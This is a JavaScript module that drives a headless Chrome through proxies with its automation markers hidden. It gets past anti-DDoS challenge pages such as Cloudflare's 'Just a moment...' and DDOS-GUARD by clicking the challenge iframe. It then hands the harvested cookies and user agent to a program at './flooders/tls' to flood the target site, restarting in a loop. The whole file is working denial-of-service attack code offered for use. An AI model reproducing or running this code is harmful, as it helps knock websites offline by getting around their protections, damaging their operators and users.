const puppeteer = require('puppeteer-extra');
const { spawn } = require('child_process');
const { UAParser } = require('ua-parser-js');

function log(text) {
  const date = new Date;
  const time = (date.getHours() < 10 ? "0" + date.getHours() : date.getHours()) + ":" + (date.getMinutes() < 10 ? "0" + date.getMinutes() : date.getMinutes()) + ":" + (date.getSeconds() < 10 ? "0" + date.getSeconds() : date.getSeconds());

  console.log(`(${time}) ${text}`)
}


async function detectIframe(page) {
    const url = await page.url();

    if (url === "chrome-error://chromewebdata/") {
        console.log("Page couldn't be loaded. Proxy die.");
        return null;
    }

    const title = await page.title();
    const domainName = new URL(url).hostname;
    
    console.log(url);
    
    if (title === domainName) {
        console.log('Title matches the domain name. Waiting for 5 seconds...');
        await page.waitForTimeout(5000); 
    }

    const iframeElement = await page.$('iframe[allow="cross-origin-isolated; fullscreen"]');
    if (iframeElement) {
        console.log('Managed challenge | Legacy captcha detected');
        return iframeElement;
    }
    return null;
}

async function clickIframe(page, iframeElement) {
  if (!iframeElement) {
      console.log('Element not found');
      return;
  }
  
  await page.waitForTimeout(350);
  
  const iframeBox = await iframeElement.boundingBox();

  if (!iframeBox) {
      console.log('Box not found');
      return;
  }

  const x = iframeBox.x + (iframeBox.width / 2);
  const y = iframeBox.y + (iframeBox.height / 2);

  console.log('Clicking in the center of the element');
  
  await page.mouse.click(x, y); 
  
  console.log('Action performed');
}


async function runBrowser(selectedProxy, rate, timeT, url) {

  const options = {
    headless: false,
    ignoreHTTPSErrors: true,
    executablePath: '/usr/bin/google-chrome-stable',
    ignoreDefaultArgs: ['--enable-automation'],
    args: [
      '--headless=new',
      '--disable-blink-features=AutomationControlled', 
      '--proxy-server=' + selectedProxy,
      '--no-sandbox',
      '--disable-accelerated-2d-canvas',
      '--no-first-run',
      '--disable-gpu',
      '--hide-scrollbars',
      '--disable-web-security',
      '--ignore-certificate-errors',
      "window-size=1920,1080",
      '--lang=en',
      '--ignore-certificate-errors-spki-list',
    ],
  };


  const browser = await puppeteer.launch(options);

  const page = await browser.newPage();


  function normal_cookies(cookies) {
    let privet = "";
    for (let i = 0; i < cookies.length; i++) {
        privet += `${cookies[i].name}=${cookies[i].value};`
    }

    return privet.slice(0, -1);
  }

  try {
    await page.goto('about:blank');
    await page.waitForTimeout(2500);

    await page.evaluate((url) => {
      window.open(url, '_blank');
    }, url);


    const userAgent = await page.evaluate(() => navigator.userAgent);

    console.log("[Browser worker]", userAgent, "|", selectedProxy);

    await page.waitForTimeout(15000);

    const allPages = await page.browser().pages();
    const newPage = allPages[allPages.length - 1];

    await newPage.waitForTimeout(7500);

    const iframeElement = await detectIframe(newPage);
    
    if (iframeElement) {
      await clickIframe(newPage, iframeElement);
      await newPage.waitForTimeout(10000);
    }
    
    const pageUrl = new URL(url);
    const domainName = pageUrl.hostname;
    
    const title = await newPage.title();
    
const blockedKeywords = [
  'Just a moment...',
  'Checking your browser...',
  'Access denied',
  'DDOS-GUARD',
  'Attention',
  'VentryShield',
  '507',
  'недоступен',
  'Wait a moment...',
  'Wait a moment',
  'Verifying browser...',
  domainName 
];
    //console.log(domainName);
    if (blockedKeywords.some(keyword => title.toLowerCase().includes(keyword.toLowerCase()))) {
        console.log(('Error: ') + title);
      await browser.close();
    }

    const parser = new UAParser();
    const result = parser.setUA(userAgent).getResult();
    const browserVersion = parseInt(result.browser.major);

    var page_Cookies = normal_cookies(await newPage.cookies()).trim();
    var page_Title = (await newPage.title()).toString().trim();

    if (page_Title == "" && page_Cookies == "" && userAgent == "", browserVersion == "") {
      log(`[STRANGE] Title: None!`);
    } else {
        log(`[Solved] Title: ${page_Title}, UA: ${userAgent}`);
        log(`Cookies: ${page_Cookies}`)
        spawnSessionWithArgs(selectedProxy, rate, timeT, url, page_Cookies, userAgent, browserVersion);
    }



     } catch (error) {
    console.error('An error occurred:', error);
    await browser.close();
  } finally {
    await browser.close();
  }
}

function spawnSessionWithArgs(selectedProxy, rate, timeT, url, page_Cookies, userAgent, browserVersion) {
    
    const args_start = [
        url,
        timeT,
        rate,
        browserVersion,
        selectedProxy.trim(),
        "2",
        `${userAgent}`,
        `${page_Cookies}`
        //`--headers=${headersString}`
    ];

    console.log("Arguments sent:", args_start.join(' '));
  
    starts = spawn('./flooders/tls', args_start, {
        stdio: 'inherit',
        detached: false,
    });
}



async function runAndRestart(selectedProxy, rate, timeT, url) {
  await runBrowser(selectedProxy, rate, timeT, url);
  runAndRestart(selectedProxy, rate, timeT, url);
}

module.exports = runAndRestart;
